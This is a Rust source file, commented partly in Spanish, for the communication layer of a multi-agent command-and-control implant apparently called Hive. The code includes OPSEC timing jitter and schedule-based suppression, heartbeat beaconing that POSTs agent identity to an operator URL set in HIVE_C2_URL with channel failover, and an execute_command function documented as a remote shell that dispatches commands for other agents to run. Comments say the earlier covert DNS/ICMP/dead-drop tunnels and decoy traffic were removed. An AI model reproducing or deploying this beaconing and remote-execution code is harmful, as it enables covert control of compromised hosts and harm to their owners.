// Ronda 11 (P2 del ROADMAP): lint progresivo - prohibido .unwrap() fuera de
// tests en los modulos core del arena/protocolo. Los tests pueden usarlo.
#![cfg_attr(not(test), deny(clippy::unwrap_used))]

// Communication layer: shared-memory arena instead of TCP bus.
// Each agent writes to and reads from a common ring buffer in shared memory.
// No sockets, no ports, no separate bus process.
//
// Integrated with OPSEC (jitter + decoys + schedule), multi-channel C2
// failover and operator tasking.

use crate::arena_mgr;
use crate::identity::AgentIdentity;
use crate::ldc::{Message, Role};
use crate::shared_arena as arena;
use crate::telemetry::{self, EventType, TelemetryCollector};
use ed25519_dalek::Signer;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::sync::Mutex;
use tracing::{info, warn};
use uuid::Uuid;

use crate::c2_channels::{C2ChannelConfig, ChannelKind, FailoverDirector, FailoverPolicy};
use crate::opsec::OpsecEngine;

// ── HiveChamber ─────────────────────────────────────────────────────────────

pub struct HiveChamber {
    arena: Arc<arena_mgr::SharedArenaMapping>,
    identity: AgentIdentity,
    my_slot: usize,
    my_role: u8,
    last_read_seq: AtomicU64,
    pub telemetry: Option<TelemetryCollector>,
    opsec_engine: Mutex<Option<OpsecEngine>>,
    failover: tokio::sync::Mutex<Option<FailoverDirector>>,
}

impl HiveChamber {
    /// Connect to the swarm via shared memory arena.
    pub async fn connect(identity: &AgentIdentity, role: Role) -> Result<Self, std::io::Error> {
        let role_u8 = role_to_u8(&role);

        let mapping = arena_mgr::connect_to_arena()?;
        let ptr = mapping.as_ptr();

        if !arena::verify_arena(ptr) {
            arena::init_arena(ptr);
            let tb = telemetry::TelemetryBuffer::open(ptr);
            tb.init();
            info!("Initialized colmena arena (shared memory)");
        }

        let id_bytes = identity.id().as_bytes().to_owned();
        // Ronda 9: role/verifying_key forman parte del claim — se escriben
        // con el slot aún RESERVED y se publican atómicamente con ACTIVE.
        // (Antes se escribían tras publicar, en carrera con enumerate.)
        let slot_idx =
            arena::find_or_claim_agent_slot(ptr, id_bytes, role_u8, identity.verifying_key_bytes())
                .ok_or_else(|| {
                    std::io::Error::new(
                        std::io::ErrorKind::AddrInUse,
                        "Arena full - no agent slots available",
                    )
                })?;

        let now = crate::utils::timestamp_now();
        arena::update_heartbeat(ptr, slot_idx, now);

        let start_seq = arena::write_cursor_ref(ptr).load(Ordering::Acquire);

        info!(
            "Connected to colmena arena (slot {}, role: {:?})",
            slot_idx, role
        );

        let telemetry_dir =
            std::env::var("HIVE_TELEMETRY_DIR").unwrap_or_else(|_| "/tmp/hive_telemetry".into());
        let agent_id_bytes = identity.id().as_bytes().to_owned();
        let collector =
            TelemetryCollector::new(agent_id_bytes, ptr, &PathBuf::from(&telemetry_dir));

        Ok(Self {
            arena: Arc::new(mapping),
            identity: identity.clone(),
            my_slot: slot_idx,
            my_role: role_u8,
            last_read_seq: AtomicU64::new(start_seq),
            telemetry: Some(collector),
            opsec_engine: Mutex::new(None),
            failover: tokio::sync::Mutex::new(None),
        })
    }

    /// Publish a signed LdC message to the arena.
    pub async fn publish(&self, msg: Message) {
        let ptr = self.arena.as_ptr();

        let data = rmp_serde::to_vec(&msg).unwrap_or_default();
        if data.len() > arena::MAX_MSG_SIZE {
            warn!("Message too large ({} bytes), truncating", data.len());
        }

        let sign_key = self.identity.signing_key();
        let mut signature_bytes = [0u8; 64];
        let sig = sign_key.sign(&data);
        signature_bytes.copy_from_slice(&sig.to_bytes());

        let verifying_key = self.identity.verifying_key_bytes();
        let id_bytes = self.identity.id().as_bytes().to_owned();

        let (seq, slot_idx) = arena::claim_slot(ptr);
        let slot = arena::message_slot_mut(ptr, slot_idx);

        arena::write_message_slot(
            slot,
            seq,
            msg.timestamp,
            id_bytes,
            verifying_key,
            signature_bytes,
            self.my_role,
            &data,
        );

        if let Some(ref t) = self.telemetry {
            let event_type = match &msg.payload {
                crate::ldc::Payload::Belief { .. } => EventType::BeliefPublished,
                crate::ldc::Payload::Vote { .. } => EventType::VoteCast,
                _ => EventType::MessageSerialized,
            };
            t.emit(event_type, vec![], None);
        }
    }

    // ── OPSEC engine ─────────────────────────────────────────────────────────

    /// Initialize the OPSEC engine lazily from agent identity.
    fn ensure_opsec(&self) -> std::sync::MutexGuard<'_, Option<OpsecEngine>> {
        // Poison-recovery: el engine es reconstruible — si otro hilo
        // paniqueó con el lock tomado, seguimos con el estado interior en
        // vez de propagar el panic a todo el agente.
        let mut guard = self
            .opsec_engine
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner());
        if guard.is_none() {
            *guard = Some(OpsecEngine::new(self.identity.id().as_bytes()));
            info!("OPSEC: engine initialized for agent {}", self.identity.id());
        }
        guard
    }

    /// Initialize the FailoverDirector lazily from env vars.
    ///
    /// Ronda 12: SOLO el canal Http real (HIVE_C2_URL) más el respaldo
    /// local. Los registros de DnsTunnel (HIVE_C2_DNS_DOMAIN), IcmpTunnel
    /// (HIVE_C2_ICMP_TARGET) y DeadDrop (HIVE_C2_DEAD_DROP_TOKEN) fueron
    /// eliminados junto con las implementaciones de esos túneles — eran
    /// transportes encubiertos sin documentar (véase c2_channels.rs).
    async fn ensure_failover(&self) -> tokio::sync::MutexGuard<'_, Option<FailoverDirector>> {
        let mut guard = self.failover.lock().await;
        if guard.is_none() {
            let mut director = FailoverDirector::new(FailoverPolicy::Priority);

            // HTTP/S channel from HIVE_C2_URL env
            if std::env::var("HIVE_C2_URL").is_ok() {
                director.add_channel(C2ChannelConfig {
                    name: "http_primary".into(),
                    kind: ChannelKind::Http,
                    priority: 1,
                    ..Default::default()
                });
            }

            // Always add at least a local HTTP fallback
            if director.channels.is_empty() {
                director.add_channel(C2ChannelConfig {
                    name: "local_log".into(),
                    kind: ChannelKind::Http,
                    priority: 99,
                    ..Default::default()
                });
            }

            info!(
                "FailoverDirector: {} channel(s) configured (http only — covert transports removed in ronda 12)",
                director.channels.len()
            );
            *guard = Some(director);
        }
        guard
    }

    /// Update OPSEC calibration from an org profile.
    pub fn calibrate_opsec(&self, profile: &crate::smoke_signals::OrgCloudProfile) {
        let mut guard = self.ensure_opsec();
        if let Some(ref mut engine) = *guard {
            engine.calibrate(profile);
            info!("OPSEC: calibrated from org profile");
        }
    }

    // ── send_heartbeat (OPSEC + multi-channel C2) ────────────────────────────

    /// Send a heartbeat: update our last_heartbeat, run OPSEC cycle, beacon C2.
    ///
    /// Integrated with OpsecEngine for jitter + decoys + schedule compliance.
    /// Integrated with FailoverDirector for multi-channel C2 delivery.
    /// Falls back to legacy raw HTTP if FailoverDirector has no channels.
    pub async fn send_heartbeat(&self) {
        let now = crate::utils::timestamp_now();
        arena::update_heartbeat(self.arena.as_ptr(), self.my_slot, now);

        if let Some(ref t) = self.telemetry {
            t.emit(EventType::HeartbeatSent, vec![], None);
        }

        // Run OPSEC cycle (schedule check + timing only — ronda 12: sin
        // decoys de red; el ciclo nunca genera tráfico)
        let opsec_delay_ms = {
            let mut guard = self.ensure_opsec();
            if let Some(ref mut engine) = *guard {
                if !engine.should_act() {
                    info!("OPSEC: heartbeat suppressed (schedule)");
                    return;
                }
                let delay = engine.cycle();
                delay.as_millis() as u64
            } else {
                0
            }
        };

        // Apply OPSEC jitter delay
        if opsec_delay_ms > 0 {
            tokio::time::sleep(std::time::Duration::from_millis(opsec_delay_ms)).await;
        }

        // Build beacon payload
        let beacon = format!(
            r#"{{"type":"heartbeat","agent_id":"{}","role":"{:?}","timestamp":{}}}"#,
            self.identity.id(),
            self.role(),
            now
        );

        // ── Entrega REAL al C2 (primaria, ronda 11) ──────────────────────
        // Antes el beacon solo pasaba por el FailoverDirector, cuyo canal
        // "Http" en realidad escribía un fichero en /tmp (lab) o POSTEABA a
        // un proveedor cloud con UA suplantado (producción) — jamás llegaba
        // al C2 mientras el log afirmaba "delivered via failover director".
        // Ahora: POST directo a HIVE_C2_URL y, solo si falla, intento de
        // canales alternativos del director (DNS/ICMP/dead-drop/lab sink).
        let sent_direct = match std::env::var("HIVE_C2_URL") {
            Ok(raw) if !raw.trim().is_empty() => {
                let beacon_url = format!("{}/beacon", crate::task_poller::normalize_c2_base(&raw));
                send_c2_beacon(&beacon_url, &beacon).await
            }
            _ => false,
        };
        if sent_direct {
            info!("C2: heartbeat delivered to HIVE_C2_URL");
        }

        // Canales alternativos (experiments de transporte del lab).
        let sent_via_failover = {
            let mut guard = self.ensure_failover().await;
            if let Some(ref mut director) = *guard {
                let results = director.send_with_failover(beacon.as_bytes()).await;
                let success = results.iter().any(|r| r.success);
                if success {
                    info!("SMOKE: heartbeat captured via alternate failover channel");
                } else if !sent_direct {
                    warn!("SMOKE: all failover channels failed for heartbeat");
                }
                success
            } else {
                false
            }
        };

        if !sent_direct && !sent_via_failover {
            if let Ok(c2_url) = std::env::var("HIVE_C2_URL") {
                if !c2_url.trim().is_empty() {
                    warn!("C2: heartbeat could not be delivered to {}", c2_url);
                }
            }
        }
    }

    // ── execute_command (D-6: remote shell via arena) ───────────────────────

    /// Dispatch a shell command via arena Request for remote execution.
    /// Other agents (Queen, Honeybee) pick up `service:"exec"` requests,
    /// execute them, and publish the result as a belief.
    /// Returns the cmd_id for tracking.
    pub async fn execute_command(&self, cmd: &str) -> Uuid {
        let cmd_id = Uuid::new_v4();
        let payload = rmp_serde::to_vec(&serde_json::json!({
            "cmd": cmd,
            "cmd_id": cmd_id.to_string(),
        }))
        .unwrap_or_default();

        let msg = Message {
            agent_id: self.identity.id(),
            agent_role: self.role(),
            timestamp: crate::utils::timestamp_now(),
            payload: crate::ldc::Payload::Request {
                service: "exec".into(),
                payload,
            },
        };
        self.publish(msg).await;
        info!("EXEC: dispatched cmd_id={}: {}", cmd_id, cmd);
        cmd_id
    }

    // ── send_beacon_c2 (multi-channel beaconing) ─────────────────────────────

    /// Send an arbitrary beacon payload to the C2.
    ///
    /// Ronda 11: entrega DIRECTA a `HIVE_C2_URL` (POST `{base}/beacon`) como
    /// camino primario; los canales alternativos del FailoverDirector
    /// (DNS/ICMP/dead-drop y el sink de lab) solo se intentan si el directo
    /// falla. Antes el payload iba SOLO por el director — cuyo canal "Http"
    /// era el sink local o el masquerade cloud eliminado — y el log
    /// afirmaba "delivered" sin que el C2 lo hubiese recibido jamás.
    pub async fn send_beacon_c2(&self, data: &[u8]) -> bool {
        // Primario: HTTP directo al C2 del operador.
        if let Ok(raw) = std::env::var("HIVE_C2_URL") {
            if !raw.trim().is_empty() {
                let beacon_url = format!("{}/beacon", crate::task_poller::normalize_c2_base(&raw));
                let body = String::from_utf8_lossy(data).to_string();
                if send_c2_beacon(&beacon_url, &body).await {
                    info!("C2: beacon delivered to HIVE_C2_URL");
                    return true;
                }
            }
        }

        // Respaldo: canales alternativos del director (experiments de lab).
        let mut guard = self.ensure_failover().await;
        if let Some(ref mut director) = *guard {
            let results = director.send_with_failover(data).await;
            let success = results.iter().any(|r| r.success);
            if success {
                info!(
                    "C2: beacon captured via alternate failover channel ({} tried)",
                    results.len()
                );
            } else {
                warn!("C2: beacon failed on all {} channels", results.len());
            }
            success
        } else {
            false
        }
    }

    // ── accessors (unchanged API) ────────────────────────────────────────────

    pub async fn read_new(&self) -> Vec<Message> {
        let ptr = self.arena.as_ptr();
        let mut messages = Vec::new();

        let current_cursor = arena::write_cursor_ref(ptr);
        let latest_seq = current_cursor.load(Ordering::Acquire);
        let mut my_seq = self.last_read_seq.load(Ordering::Relaxed);

        if latest_seq > my_seq + (arena::MAX_MESSAGES as u64) {
            my_seq = latest_seq.saturating_sub(arena::MAX_MESSAGES as u64);
        }

        while my_seq < latest_seq {
            let slot_idx = (my_seq % arena::MAX_MESSAGES as u64) as usize;
            let slot = arena::message_slot_ptr(ptr, slot_idx);

            let slot_seq = arena::read_slot_seq(slot);
            if slot_seq > my_seq {
                my_seq += 1;
                continue;
            }
            // A slot is only "not yet written" when its seq AND payload are
            // both still zero from arena init. The very first published
            // message legitimately has seq == 0 — treating plain seq == 0 as
            // empty used to wedge every reader that connected before the
            // first publish until the ring wrapped around.
            let slot_empty = slot_seq == 0 && unsafe { (*slot).payload_len } == 0;
            if slot_empty {
                break;
            }

            unsafe {
                let payload_len = (*slot).payload_len as usize;
                if payload_len > 0 && payload_len <= arena::MAX_MSG_SIZE {
                    let before_seq = (*slot).seq.load(Ordering::Acquire);
                    if before_seq != slot_seq {
                        my_seq += 1;
                        continue;
                    }

                    let mut payload_buf = [0u8; arena::MAX_MSG_SIZE];
                    std::ptr::copy_nonoverlapping(
                        (*slot).payload.as_ptr(),
                        payload_buf.as_mut_ptr(),
                        payload_len,
                    );

                    let after_seq = (*slot).seq.load(Ordering::Acquire);
                    if after_seq != before_seq {
                        my_seq += 1;
                        continue;
                    }

                    let payload_slice = &payload_buf[..payload_len];
                    let vk_bytes = &(*slot).verifying_key;
                    let sig_bytes = &(*slot).signature;

                    if !AgentIdentity::verify_with_key(vk_bytes, payload_slice, sig_bytes) {
                        my_seq += 1;
                        continue;
                    }

                    if let Ok(msg) = rmp_serde::from_slice::<Message>(payload_slice) {
                        if msg.agent_id.as_bytes() == &(*slot).agent_id
                            && msg.agent_id != self.identity.id()
                        {
                            messages.push(msg);
                        }
                    }
                }
            }
            my_seq += 1;
        }

        self.last_read_seq.store(my_seq, Ordering::Release);
        messages
    }

    pub async fn get_active_agents(&self, timeout_secs: u64) -> Vec<(Uuid, Role, u64)> {
        let ptr = self.arena.as_ptr();
        let now = crate::utils::timestamp_now();
        let mut agents = Vec::new();

        arena::enumerate_agents(ptr, |id_bytes, role_u8, hb, _vk| {
            if now.saturating_sub(hb) < timeout_secs {
                let id = Uuid::from_bytes(id_bytes);
                let role = u8_to_role(role_u8);
                agents.push((id, role, hb));
            }
        });

        agents
    }

    pub async fn check_dead_agents(&self, timeout_secs: u64) -> Vec<Uuid> {
        let ptr = self.arena.as_ptr();
        let now = crate::utils::timestamp_now();
        let mut dead = Vec::new();

        for i in 0..arena::MAX_AGENTS {
            let flags = arena::agent_flags_val(ptr, i);
            if (flags & 1) != 0 && (flags & 2) == 0 {
                let hb = arena::last_heartbeat_val(ptr, i);
                if now.saturating_sub(hb) > timeout_secs {
                    let id_bytes = arena::agent_id_val(ptr, i);
                    arena::mark_agent_dead(ptr, i);
                    let id = Uuid::from_bytes(id_bytes);
                    warn!(
                        "Agent {} marked DEAD (no heartbeat for {}s)",
                        id,
                        now.saturating_sub(hb)
                    );
                    dead.push(id);
                }
            }
        }

        dead
    }

    pub fn arena_ptr(&self) -> *mut u8 {
        self.arena.as_ptr()
    }
    pub fn agent_id(&self) -> Uuid {
        self.identity.id()
    }
    pub fn role(&self) -> Role {
        u8_to_role(self.my_role)
    }
    pub fn identity(&self) -> &AgentIdentity {
        &self.identity
    }
    pub fn my_slot_idx(&self) -> usize {
        self.my_slot
    }
}

fn u8_to_role(val: u8) -> Role {
    match val {
        0 => Role::Worker,
        1 => Role::Weaver,
        2 => Role::Drone,
        3 => Role::Honeybee,
        4 => Role::Queen,
        5 => Role::Swarm,
        _ => Role::Worker,
    }
}

fn role_to_u8(role: &Role) -> u8 {
    match role {
        Role::Worker => 0,
        Role::Weaver => 1,
        Role::Drone => 2,
        Role::Honeybee => 3,
        Role::Queen => 4,
        Role::Swarm => 5,
    }
}

/// Legacy fallback: send a beacon via raw HTTPS POST.
/// Devuelve `true` si el C2 respondió 2xx (ronda 11: antes se ignoraba el
/// resultado y el log daba la entrega por buena sin saberlo).
async fn send_c2_beacon(c2_url: &str, body: &str) -> bool {
    let client = match reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .user_agent("Hive/3.0")
        .build()
    {
        Ok(c) => c,
        Err(_) => return false,
    };
    match client
        .post(c2_url)
        .header("Content-Type", "application/json")
        .body(body.to_owned())
        .send()
        .await
    {
        Ok(resp) => resp.status().is_success(),
        Err(_) => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_role_to_u8() {
        assert_eq!(role_to_u8(&Role::Worker), 0);
        assert_eq!(role_to_u8(&Role::Queen), 4);
        assert_eq!(role_to_u8(&Role::Swarm), 5);
    }

    #[test]
    fn test_u8_to_role() {
        assert_eq!(u8_to_role(0), Role::Worker);
        assert_eq!(u8_to_role(4), Role::Queen);
        assert_eq!(u8_to_role(99), Role::Worker);
    }

    #[test]
    fn test_opsec_initialization() {
        // Verify OPSEC engine can be created without panic (ronda 12:
        // timing-only — sin contador de decoys)
        let engine = OpsecEngine::new(b"test-agent");
        assert_eq!(engine.cycles_completed, 0);
    }

    #[test]
    fn test_failover_default_config() {
        // Verify FailoverDirector can hold channels
        let mut director = FailoverDirector::new(FailoverPolicy::Priority);
        director.add_channel(C2ChannelConfig {
            name: "test".into(),
            kind: ChannelKind::Http,
            priority: 1,
            ..Default::default()
        });
        assert_eq!(director.channels.len(), 1);
    }
}
